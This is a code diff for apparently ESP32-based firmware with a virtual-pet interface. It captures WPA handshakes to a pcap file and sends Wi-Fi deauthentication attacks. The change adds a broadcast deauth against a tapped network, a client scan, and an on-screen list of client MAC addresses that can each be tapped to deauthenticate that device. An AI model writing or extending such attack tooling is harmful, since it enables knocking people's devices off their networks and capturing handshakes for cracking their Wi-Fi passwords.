@@ -22,17 +22,38 @@ unsigned long lastScanTime = 0;
 
 bool scanning = false;
 int redSeleccionada = -1;
+bool mostrandoClientes = false;
+unsigned long clientDisplayTime = 0;
 
 ClienteInfo* clientes = nullptr;
 int numClientes = 0;
-bool escaneandoClientes = false;
-unsigned long clientScanStart = 0;
 
 void onHandshakeCaptured(const uint8_t* frame, uint32_t len) {
     uint32_t ts = millis();
     pcap.writePacket(frame, len, ts/1000, (ts%1000)*1000);
     mascota.incrementarHandshakes();
     Serial.printf("Handshake capturado! %d bytes\n", len);
+}
+
+void dibujarListaClientes() {
+    tft.fillRect(0, 30, 240, 170, TFT_BLACK);
+    tft.setTextColor(TFT_WHITE);
+    tft.setTextSize(1);
+    
+    int y = 35;
+    tft.setCursor(5, y);
+    tft.println("Clientes encontrados:");
+    y += 15;
+    
+    for (int i = 0; i < numClientes && i < 8; i++) {
+        tft.setCursor(5, y);
+        tft.printf("%02X:%02X:%02X:%02X:%02X:%02X",
+            clientes[i].mac[0], clientes[i].mac[1], clientes[i].mac[2],
+            clientes[i].mac[3], clientes[i].mac[4], clientes[i].mac[5]);
+        tft.setCursor(140, y);
+        tft.print(clientes[i].fabricante);
+        y += 18;
+    }
 }
 
 void setup() {
@@ -67,33 +88,73 @@ void loop() {
     mascota.update();
     mascota.dibujar();
     
+    // Si estamos mostrando la lista de clientes, la dibujamos
+    if (mostrandoClientes && millis() - clientDisplayTime < 5000) {
+        dibujarListaClientes();
+        // Mostrar mensaje de ayuda
+        tft.setTextColor(TFT_YELLOW);
+        tft.setCursor(5, 180);
+        tft.print("Toca un cliente para atacarlo");
+        tft.setTextColor(TFT_WHITE);
+    } else if (mostrandoClientes) {
+        mostrandoClientes = false;
+        // Limpiar la zona de clientes
+        tft.fillRect(0, 30, 240, 170, TFT_BLACK);
+        clientes = nullptr;
+        numClientes = 0;
+    }
+    
+    // --- Táctil ---
     if (touch.touched()) {
         TS_Point p = touch.getPoint();
         int x = map(p.x, 0, 4095, 0, 240);
         int y = map(p.y, 0, 4095, 0, 320);
         
-        if (mascota.getEstado() == ESTADO_IDLE && y > 200) {
+        // Zona de clientes (si está activa)
+        if (mostrandoClientes && y > 30 && y < 200) {
+            int indice = (y - 35) / 18;
+            if (indice >= 0 && indice < numClientes) {
+                mascota.setEstado(ESTADO_ATTACK);
+                hunter.deauth(redes[redSeleccionada], clientes[indice].mac, 30);
+                Serial.printf("Atacando cliente: %02X:%02X:%02X:%02X:%02X:%02X\n",
+                    clientes[indice].mac[0], clientes[indice].mac[1],
+                    clientes[indice].mac[2], clientes[indice].mac[3],
+                    clientes[indice].mac[4], clientes[indice].mac[5]);
+                delay(100);
+                mascota.setEstado(ESTADO_IDLE);
+            }
+        }
+        // Zona de redes (parte inferior)
+        else if (mascota.getEstado() == ESTADO_IDLE && y > 200) {
             int indice = (y - 200) / 20;
             if (indice < numRedes) {
                 redSeleccionada = indice;
                 mascota.setEstado(ESTADO_ATTACK);
                 
+                // Primero atacamos por broadcast
                 hunter.deauth(redes[redSeleccionada], nullptr, 30);
                 
-                // Opcional: escanear clientes
-                // hunter.scanClients(redes[redSeleccionada].bssid, redes[redSeleccionada].canal);
-                // clientes = hunter.getClientes(numClientes);
+                // Luego escaneamos clientes de esa red
+                hunter.scanClients(redes[redSeleccionada].bssid, redes[redSeleccionada].canal);
+                clientes = hunter.getClientes(numClientes);
+                
+                if (numClientes > 0) {
+                    mostrandoClientes = true;
+                    clientDisplayTime = millis();
+                    Serial.printf("Clientes encontrados: %d\n", numClientes);
+                }
                 
                 delay(100);
                 mascota.setEstado(ESTADO_IDLE);
             }
-        } else if (mascota.getEstado() == ESTADO_IDLE && y > 100 && y < 200) {
-            // Zona para mostrar clientes (pendiente)
-        } else {
+        }
+        // Tocar la mascota
+        else {
             mascota.tocar(x, y);
         }
     }
     
+    // --- Escaneo de redes ---
     if (!scanning && millis() - lastScanTime > SCAN_INTERVAL) {
         mascota.setEstado(ESTADO_SCANNING);
         hunter.startScan();
